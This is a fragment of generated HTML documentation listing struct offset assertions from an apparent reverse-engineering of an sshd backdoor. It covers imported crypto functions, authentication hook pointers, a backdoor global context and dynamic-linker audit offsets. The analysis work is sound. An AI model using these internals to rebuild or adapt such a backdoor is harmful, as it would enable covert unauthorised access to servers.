<tr class="memitem:ae5361f6713ec771fba1da20f1527ee09"><td class="memItemLeft" align="right" valign="top"><a id="ae5361f6713ec771fba1da20f1527ee09"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DigestVerifyInit, 0x80)</td></tr>
<tr class="separator:ae5361f6713ec771fba1da20f1527ee09"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6743e3f7daa3de9aab69f5ef92ecc47d"><td class="memItemLeft" align="right" valign="top"><a id="a6743e3f7daa3de9aab69f5ef92ecc47d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DigestVerify, 0x88)</td></tr>
<tr class="separator:a6743e3f7daa3de9aab69f5ef92ecc47d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5271d6a4cbc70ff5992fd17319b3cd95"><td class="memItemLeft" align="right" valign="top"><a id="a5271d6a4cbc70ff5992fd17319b3cd95"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_MD_CTX_free, 0x90)</td></tr>
<tr class="separator:a5271d6a4cbc70ff5992fd17319b3cd95"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a45f8a45c924a6f26f414d592033c9f7d"><td class="memItemLeft" align="right" valign="top"><a id="a45f8a45c924a6f26f414d592033c9f7d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_PKEY_free, 0x98)</td></tr>
<tr class="separator:a45f8a45c924a6f26f414d592033c9f7d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acdd8da9c279377f086aab6d205f6844b"><td class="memItemLeft" align="right" valign="top"><a id="acdd8da9c279377f086aab6d205f6844b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_CIPHER_CTX_new, 0xA0)</td></tr>
<tr class="separator:acdd8da9c279377f086aab6d205f6844b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afdb57a8f4309629adfcf8c842c503176"><td class="memItemLeft" align="right" valign="top"><a id="afdb57a8f4309629adfcf8c842c503176"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DecryptInit_ex, 0xA8)</td></tr>
<tr class="separator:afdb57a8f4309629adfcf8c842c503176"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af3a1887614fbee1696da57f7dc6e9864"><td class="memItemLeft" align="right" valign="top"><a id="af3a1887614fbee1696da57f7dc6e9864"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DecryptUpdate, 0xB0)</td></tr>
<tr class="separator:af3a1887614fbee1696da57f7dc6e9864"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa02f27ad8051268be4613cb9827eb1b3"><td class="memItemLeft" align="right" valign="top"><a id="aa02f27ad8051268be4613cb9827eb1b3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_DecryptFinal_ex, 0xB8)</td></tr>
<tr class="separator:aa02f27ad8051268be4613cb9827eb1b3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac475dcc45734903683471084caad0918"><td class="memItemLeft" align="right" valign="top"><a id="ac475dcc45734903683471084caad0918"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_CIPHER_CTX_free, 0xC0)</td></tr>
<tr class="separator:ac475dcc45734903683471084caad0918"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae63f8a206a3f03f7fb8260f6fe606438"><td class="memItemLeft" align="right" valign="top"><a id="ae63f8a206a3f03f7fb8260f6fe606438"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_chacha20, 0xC8)</td></tr>
<tr class="separator:ae63f8a206a3f03f7fb8260f6fe606438"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a03e5c50bca35bcc32f1859f2b2ddb7b8"><td class="memItemLeft" align="right" valign="top"><a id="a03e5c50bca35bcc32f1859f2b2ddb7b8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_new, 0xD0)</td></tr>
<tr class="separator:a03e5c50bca35bcc32f1859f2b2ddb7b8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adce484d36308b289a9cc3bd3a5a2dda4"><td class="memItemLeft" align="right" valign="top"><a id="adce484d36308b289a9cc3bd3a5a2dda4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_dup, 0xD8)</td></tr>
<tr class="separator:adce484d36308b289a9cc3bd3a5a2dda4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab8ea945c77605c2b6012b055955b4d38"><td class="memItemLeft" align="right" valign="top"><a id="ab8ea945c77605c2b6012b055955b4d38"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_bin2bn, 0xE0)</td></tr>
<tr class="separator:ab8ea945c77605c2b6012b055955b4d38"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afce8c57269083c142ddd7aea866aa6b6"><td class="memItemLeft" align="right" valign="top"><a id="afce8c57269083c142ddd7aea866aa6b6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_set0_key, 0xE8)</td></tr>
<tr class="separator:afce8c57269083c142ddd7aea866aa6b6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3cb21a334291a1a16d2f547aecadfb6f"><td class="memItemLeft" align="right" valign="top"><a id="a3cb21a334291a1a16d2f547aecadfb6f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, EVP_Digest, 0xF0)</td></tr>
<tr class="separator:a3cb21a334291a1a16d2f547aecadfb6f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a204c89138b3b25ccaf4aeb753c6834c7"><td class="memItemLeft" align="right" valign="top"><a id="a204c89138b3b25ccaf4aeb753c6834c7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_sign, 0xF8)</td></tr>
<tr class="separator:a204c89138b3b25ccaf4aeb753c6834c7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a643d3a39abf92b1a5c4cd89435ab51ab"><td class="memItemLeft" align="right" valign="top"><a id="a643d3a39abf92b1a5c4cd89435ab51ab"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_bn2bin, 0x100)</td></tr>
<tr class="separator:a643d3a39abf92b1a5c4cd89435ab51ab"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a455ac4af3eb01b235e75df7043c6384f"><td class="memItemLeft" align="right" valign="top"><a id="a455ac4af3eb01b235e75df7043c6384f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, RSA_free, 0x108)</td></tr>
<tr class="separator:a455ac4af3eb01b235e75df7043c6384f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae9f62e7e684eb1f90580b1f9c7e39d9e"><td class="memItemLeft" align="right" valign="top"><a id="ae9f62e7e684eb1f90580b1f9c7e39d9e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, BN_free, 0x110)</td></tr>
<tr class="separator:ae9f62e7e684eb1f90580b1f9c7e39d9e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9a0e5e1a42b92c15477e0774d1662508"><td class="memItemLeft" align="right" valign="top"><a id="a9a0e5e1a42b92c15477e0774d1662508"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, libc, 0x118)</td></tr>
<tr class="separator:a9a0e5e1a42b92c15477e0774d1662508"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a41f247c8e977b275256102c5a2af23c7"><td class="memItemLeft" align="right" valign="top"><a id="a41f247c8e977b275256102c5a2af23c7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structimported__funcs.html">imported_funcs_t</a>, resolved_imports_count, 0x120)</td></tr>
<tr class="separator:a41f247c8e977b275256102c5a2af23c7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a36fc05d39c0e32f26d703aafdd5327f7"><td class="memItemLeft" align="right" valign="top"><a id="a36fc05d39c0e32f26d703aafdd5327f7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_authpassword_start, 0x28)</td></tr>
<tr class="separator:a36fc05d39c0e32f26d703aafdd5327f7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7542b00af05c4649a264d55289071559"><td class="memItemLeft" align="right" valign="top"><a id="a7542b00af05c4649a264d55289071559"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_authpassword_end, 0x30)</td></tr>
<tr class="separator:a7542b00af05c4649a264d55289071559"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a13a89203686f0be643fbea618cc24e50"><td class="memItemLeft" align="right" valign="top"><a id="a13a89203686f0be643fbea618cc24e50"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, monitor_req_authpassword, 0x38)</td></tr>
<tr class="separator:a13a89203686f0be643fbea618cc24e50"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aead6a08aab3c9bd7ab2e9ba62c9c797c"><td class="memItemLeft" align="right" valign="top"><a id="aead6a08aab3c9bd7ab2e9ba62c9c797c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyallowed_start, 0x48)</td></tr>
<tr class="separator:aead6a08aab3c9bd7ab2e9ba62c9c797c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acf35f3e5bfaeb9a09d066514ee495ec0"><td class="memItemLeft" align="right" valign="top"><a id="acf35f3e5bfaeb9a09d066514ee495ec0"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyallowed_end, 0x50)</td></tr>
<tr class="separator:acf35f3e5bfaeb9a09d066514ee495ec0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a587cc578a00d535fdc4ed361ed4ae9e3"><td class="memItemLeft" align="right" valign="top"><a id="a587cc578a00d535fdc4ed361ed4ae9e3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, monitor_req_keyallowed_ptr, 0x58)</td></tr>
<tr class="separator:a587cc578a00d535fdc4ed361ed4ae9e3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac7f47f974037ec61696cab407872b18f"><td class="memItemLeft" align="right" valign="top"><a id="ac7f47f974037ec61696cab407872b18f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyverify_start, 0x68)</td></tr>
<tr class="separator:ac7f47f974037ec61696cab407872b18f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9c3403c23fcbec940f1fd828e41c2bef"><td class="memItemLeft" align="right" valign="top"><a id="a9c3403c23fcbec940f1fd828e41c2bef"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_answer_keyverify_end, 0x70)</td></tr>
<tr class="separator:a9c3403c23fcbec940f1fd828e41c2bef"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aee85772e19b163b590018bef7ca0faa0"><td class="memItemLeft" align="right" valign="top"><a id="aee85772e19b163b590018bef7ca0faa0"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, monitor_req_keyverify_ptr, 0x78)</td></tr>
<tr class="separator:aee85772e19b163b590018bef7ca0faa0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4b5bde83b5867082605cb48d3c7f8fb8"><td class="memItemLeft" align="right" valign="top"><a id="a4b5bde83b5867082605cb48d3c7f8fb8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, writebuf_size, 0x84)</td></tr>
<tr class="separator:a4b5bde83b5867082605cb48d3c7f8fb8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0ca725e7bef450d851c0007043d7d4db"><td class="memItemLeft" align="right" valign="top"><a id="a0ca725e7bef450d851c0007043d7d4db"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, writebuf, 0x88)</td></tr>
<tr class="separator:a0ca725e7bef450d851c0007043d7d4db"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa456b9b5c2b9192f222d2d2a5f2df24d"><td class="memItemLeft" align="right" valign="top"><a id="aa456b9b5c2b9192f222d2d2a5f2df24d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_request_send_start, 0xA8)</td></tr>
<tr class="separator:aa456b9b5c2b9192f222d2d2a5f2df24d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a110af2186b59d1055dece201cce86c2b"><td class="memItemLeft" align="right" valign="top"><a id="a110af2186b59d1055dece201cce86c2b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, mm_request_send_end, 0xB0)</td></tr>
<tr class="separator:a110af2186b59d1055dece201cce86c2b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a45579b24856e1b4e76615d7cb3b381ad"><td class="memItemLeft" align="right" valign="top"><a id="a45579b24856e1b4e76615d7cb3b381ad"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, use_pam_ptr, 0xC0)</td></tr>
<tr class="separator:a45579b24856e1b4e76615d7cb3b381ad"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a47d4e9fe022d5e3c8adacc70df9a831e"><td class="memItemLeft" align="right" valign="top"><a id="a47d4e9fe022d5e3c8adacc70df9a831e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, permit_root_login_ptr, 0xC8)</td></tr>
<tr class="separator:a47d4e9fe022d5e3c8adacc70df9a831e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aab93f113e7b7818954ee1a859a57c67d"><td class="memItemLeft" align="right" valign="top"><a id="aab93f113e7b7818954ee1a859a57c67d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, STR_password, 0xD0)</td></tr>
<tr class="separator:aab93f113e7b7818954ee1a859a57c67d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3611c026b817925e0b246c30cb1b3c3c"><td class="memItemLeft" align="right" valign="top"><a id="a3611c026b817925e0b246c30cb1b3c3c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__ctx.html">sshd_ctx_t</a>, STR_publickey, 0xD8)</td></tr>
<tr class="separator:a3611c026b817925e0b246c30cb1b3c3c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aecec840ff09d29fe90e97c22a131c251"><td class="memItemLeft" align="right" valign="top"><a id="aecec840ff09d29fe90e97c22a131c251"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_percent_s, 0x10)</td></tr>
<tr class="separator:aecec840ff09d29fe90e97c22a131c251"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a356af66f983295c68bd3106ad200058e"><td class="memItemLeft" align="right" valign="top"><a id="a356af66f983295c68bd3106ad200058e"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_Connection_closed_by, 0x18)</td></tr>
<tr class="separator:a356af66f983295c68bd3106ad200058e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a496516a4519fbee659bd29ca244243c6"><td class="memItemLeft" align="right" valign="top"><a id="a496516a4519fbee659bd29ca244243c6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_preauth, 0x20)</td></tr>
<tr class="separator:a496516a4519fbee659bd29ca244243c6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adb47f742d8205dde961ad9a0a0a4c8ba"><td class="memItemLeft" align="right" valign="top"><a id="adb47f742d8205dde961ad9a0a0a4c8ba"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_authenticating, 0x28)</td></tr>
<tr class="separator:adb47f742d8205dde961ad9a0a0a4c8ba"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a85a9045b32e435188105b139d33fd41b"><td class="memItemLeft" align="right" valign="top"><a id="a85a9045b32e435188105b139d33fd41b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, STR_user, 0x30)</td></tr>
<tr class="separator:a85a9045b32e435188105b139d33fd41b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a91b036c4250b1ac65cdcc5bea0c1838f"><td class="memItemLeft" align="right" valign="top"><a id="a91b036c4250b1ac65cdcc5bea0c1838f"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structsshd__log__ctx.html">sshd_log_ctx_t</a>, sshlogv, 0x58)</td></tr>
<tr class="separator:a91b036c4250b1ac65cdcc5bea0c1838f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a80a0978414f64efd7647e8f4cf4edbcc"><td class="memItemLeft" align="right" valign="top"><a id="a80a0978414f64efd7647e8f4cf4edbcc"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structimported__funcs.html">imported_funcs</a>, 0x8)</td></tr>
<tr class="separator:a80a0978414f64efd7647e8f4cf4edbcc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aaedfef00703f22d42203691747d5082a"><td class="memItemLeft" align="right" valign="top"><a id="aaedfef00703f22d42203691747d5082a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structlibc__imports.html">libc_imports</a>, 0x10)</td></tr>
<tr class="separator:aaedfef00703f22d42203691747d5082a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a60132a5cff4a43d7c8a6d73d8d88bcd8"><td class="memItemLeft" align="right" valign="top"><a id="a60132a5cff4a43d7c8a6d73d8d88bcd8"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, disable_backdoor, 0x18)</td></tr>
<tr class="separator:a60132a5cff4a43d7c8a6d73d8d88bcd8"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acd3211fbfebb3eb22721d6f21d6a4b07"><td class="memItemLeft" align="right" valign="top"><a id="acd3211fbfebb3eb22721d6f21d6a4b07"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structsshd__ctx.html">sshd_ctx</a>, 0x20)</td></tr>
<tr class="separator:acd3211fbfebb3eb22721d6f21d6a4b07"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab0be716de79473830401778739a38a11"><td class="memItemLeft" align="right" valign="top"><a id="ab0be716de79473830401778739a38a11"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_host_keys, 0x28)</td></tr>
<tr class="separator:ab0be716de79473830401778739a38a11"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9eef1439c8b1df4b61e641523821427d"><td class="memItemLeft" align="right" valign="top"><a id="a9eef1439c8b1df4b61e641523821427d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, <a class="el" href="structsshd__log__ctx.html">sshd_log_ctx</a>, 0x30)</td></tr>
<tr class="separator:a9eef1439c8b1df4b61e641523821427d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af1e135dccb4a40a8ae6757f215eb3fc6"><td class="memItemLeft" align="right" valign="top"><a id="af1e135dccb4a40a8ae6757f215eb3fc6"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_code_start, 0x58)</td></tr>
<tr class="separator:af1e135dccb4a40a8ae6757f215eb3fc6"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a66c6c83693984a671934b3cffaf5bc7b"><td class="memItemLeft" align="right" valign="top"><a id="a66c6c83693984a671934b3cffaf5bc7b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_code_end, 0x60)</td></tr>
<tr class="separator:a66c6c83693984a671934b3cffaf5bc7b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a0a3298d847f4396eb62a4f290d489afe"><td class="memItemLeft" align="right" valign="top"><a id="a0a3298d847f4396eb62a4f290d489afe"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_data_start, 0x68)</td></tr>
<tr class="separator:a0a3298d847f4396eb62a4f290d489afe"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad592c1dedd2cfba329ebeb5f76e72ec4"><td class="memItemLeft" align="right" valign="top"><a id="ad592c1dedd2cfba329ebeb5f76e72ec4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, sshd_data_end, 0x70)</td></tr>
<tr class="separator:ad592c1dedd2cfba329ebeb5f76e72ec4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2838327fdd0d46486c05e764fe368106"><td class="memItemLeft" align="right" valign="top"><a id="a2838327fdd0d46486c05e764fe368106"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, lzma_code_start, 0x80)</td></tr>
<tr class="separator:a2838327fdd0d46486c05e764fe368106"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4d010ee4a1c8e3f517e46abe02c82bd4"><td class="memItemLeft" align="right" valign="top"><a id="a4d010ee4a1c8e3f517e46abe02c82bd4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, lzma_code_end, 0x88)</td></tr>
<tr class="separator:a4d010ee4a1c8e3f517e46abe02c82bd4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8f40ad493b38891682b414abc9b70a32"><td class="memItemLeft" align="right" valign="top"><a id="a8f40ad493b38891682b414abc9b70a32"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, secret_data, 0x108)</td></tr>
<tr class="separator:a8f40ad493b38891682b414abc9b70a32"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a376bd60de48e9143dd59f2cb1a121619"><td class="memItemLeft" align="right" valign="top"><a id="a376bd60de48e9143dd59f2cb1a121619"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, shift_operations, 0x141)</td></tr>
<tr class="separator:a376bd60de48e9143dd59f2cb1a121619"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a319519a1d5e7deeacdd65d0b31c9dc7d"><td class="memItemLeft" align="right" valign="top"><a id="a319519a1d5e7deeacdd65d0b31c9dc7d"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structglobal__context.html">global_context_t</a>, num_shifted_bits, 0x160)</td></tr>
<tr class="separator:a319519a1d5e7deeacdd65d0b31c9dc7d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a94c3fff16b704f8d529ce25798073af3"><td class="memItemLeft" align="right" valign="top"><a id="a94c3fff16b704f8d529ce25798073af3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals_t</a>, globals, 0x10)</td></tr>
<tr class="separator:a94c3fff16b704f8d529ce25798073af3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1e918ed678d91e80af8641b9bffb0ebd"><td class="memItemLeft" align="right" valign="top"><a id="a1e918ed678d91e80af8641b9bffb0ebd"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, sshd_link_map_l_audit_any_plt_addr, 0x60)</td></tr>
<tr class="separator:a1e918ed678d91e80af8641b9bffb0ebd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a62eb5a46823ef3365476a3e0532e3f65"><td class="memItemLeft" align="right" valign="top"><a id="a62eb5a46823ef3365476a3e0532e3f65"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, link_map_l_audit_any_plt_bitmask, 0x68)</td></tr>
<tr class="separator:a62eb5a46823ef3365476a3e0532e3f65"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae822daf37f46b464fdd02e0af984cc4a"><td class="memItemLeft" align="right" valign="top"><a id="ae822daf37f46b464fdd02e0af984cc4a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, _dl_audit_offset, 0x70)</td></tr>
<tr class="separator:ae822daf37f46b464fdd02e0af984cc4a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abd9613817a2e70461b9bfbbb1cb33a55"><td class="memItemLeft" align="right" valign="top"><a id="abd9613817a2e70461b9bfbbb1cb33a55"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, _dl_naudit_offset, 0x78)</td></tr>
<tr class="separator:abd9613817a2e70461b9bfbbb1cb33a55"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a4c728d421b6aa6bdf7dec59dd95ccb76"><td class="memItemLeft" align="right" valign="top"><a id="a4c728d421b6aa6bdf7dec59dd95ccb76"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structldso__ctx.html">ldso_ctx_t</a>, libcrypto_l_name, 0xF8)</td></tr>
<tr class="separator:a4c728d421b6aa6bdf7dec59dd95ccb76"><td class="memSeparator" colspan="2">&#160;</td></tr>
